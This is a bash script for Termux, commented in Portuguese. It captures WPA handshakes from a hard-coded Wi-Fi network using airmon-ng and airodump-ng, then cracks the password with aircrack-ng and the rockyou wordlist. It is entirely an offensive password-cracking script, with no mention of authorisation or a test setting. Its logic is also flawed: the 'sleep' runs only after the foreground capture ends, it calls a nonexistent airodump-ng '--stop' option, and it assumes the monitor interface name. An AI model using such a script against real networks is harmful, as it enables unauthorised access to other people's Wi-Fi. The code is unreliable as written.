#!/data/data/com.termux/files/usr/bin/bash

# Define a interface Wi-Fi
WIFI_INTERFACE="wlan0"

# Define o canal da rede Wi-Fi
WIFI_CHANNEL="1"

# Define o BSSID da rede Wi-Fi
WIFI_BSSID="00:11:22:33:44:55"

# Define o nome do arquivo de saída
OUTPUT_FILE="wifi-capture.cap"

# Desabilita o monitoramento na interface Wi-Fi
airmon-ng stop $WIFI_INTERFACE

# Habilita o monitoramento na interface Wi-Fi
airmon-ng start $WIFI_INTERFACE

# Define a interface Wi-Fi em modo monitoramento
MONITOR_INTERFACE="$WIFI_INTERFACE-mon"

# Captura os pacotes de handshake
echo "Capturando pacotes de handshake..."
airodump-ng $MONITOR_INTERFACE --channel $WIFI_CHANNEL --bssid $WIFI_BSSID --write $OUTPUT_FILE

# Interrompe a captura de pacotes após 10 minutos
sleep 600

# Para a captura de pacotes
echo "Parando a captura de pacotes..."
airodump-ng $MONITOR_INTERFACE --channel $WIFI_CHANNEL --bssid $WIFI_BSSID --stop

# Desabilita o monitoramento na interface Wi-Fi
airmon-ng stop $MONITOR_INTERFACE

# Tenta quebrar a senha do handshake capturado
echo "Tentando quebrar a senha do handshake capturado..."
aircrack-ng $OUTPUT_FILE*.cap -w /data/data/com.termux/files/usr/share/wordlists/rockyou.txt